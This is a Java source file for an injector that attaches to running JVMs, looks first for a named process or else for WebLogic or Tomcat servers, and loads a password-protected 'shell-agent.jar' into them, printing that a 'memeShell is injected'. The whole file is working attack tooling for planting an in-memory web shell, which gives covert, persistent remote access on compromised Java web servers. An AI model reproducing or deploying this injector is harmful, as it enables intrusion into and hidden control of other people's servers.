package main.java;

import com.sun.tools.attach.*;

import java.io.File;
import java.io.IOException;
import java.util.List;

public class Attach {

    public static void main(String[] args) throws IOException {
        if (args.length == 0) {
            System.out.println("Usage: java -jar inject.jar <password>");
            return;
        }
        String password = args[0];

        if ("-p".equals(password)) {
            printVirtualMachine();
            return;
        }

        String process = args.length > 1 ? args[1] : null;

        String currentPath = Attach.class.getProtectionDomain().getCodeSource().getLocation().getPath();
        currentPath = currentPath.substring(0, currentPath.lastIndexOf("/") + 1);
        String agentFile = currentPath + "shell-agent.jar";
        File file = new File(agentFile);
        agentFile = file.getCanonicalPath();
        if (!file.exists()) {
            System.out.println("[-] Agent Not Found, Load Path:" + agentFile);
            System.exit(-1);
        }
        System.out.println("[+] Load Agent Path:" + agentFile);

        String agentArgs = currentPath;
        agentArgs = agentArgs + "^" + password;

        while (true) {
            try {
                if (inject(agentArgs, agentFile,process)) {
                    return;
                } else {
                    Thread.sleep(3000);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

    }

    private static boolean inject(String agentArgs, String agentPath,String process) throws Exception {
        List<VirtualMachineDescriptor> vmList = VirtualMachine.list();
        if (vmList.size() <= 0)
            return false;
        if (process != null){
            for (VirtualMachineDescriptor vmd : vmList) {
                String displayName = vmd.displayName();
                if (displayName.equals(process)){
                   return inject(vmd,agentArgs,agentPath);
                }
            }
        }

        for (VirtualMachineDescriptor vmd : vmList) {
            String displayName = vmd.displayName();
            if (displayName.contains("weblogic.Server") || displayName.contains("catalina")) {
                return inject(vmd,agentArgs,agentPath);
            }
        }
        return false;
    }
    private static boolean inject(VirtualMachineDescriptor vmd,String agentArgs, String agentPath) throws AgentLoadException, IOException, AgentInitializationException, InterruptedException, AttachNotSupportedException {
        VirtualMachine vm = VirtualMachine.attach(vmd);
        System.out.println("[+] OK.i find a jvm:" + vmd.displayName());
        Thread.sleep(1000);
        if (null != vm) {
            vm.loadAgent(agentPath, agentArgs);
            System.out.println("[+] memeShell is injected.");
            vm.detach();
            return true;
        }
        return false;
    }

    private static void printVirtualMachine() {
        List<VirtualMachineDescriptor> vmList = VirtualMachine.list();
        for (VirtualMachineDescriptor vmd : vmList) {
            System.out.println(vmd.displayName());
        }
    }
}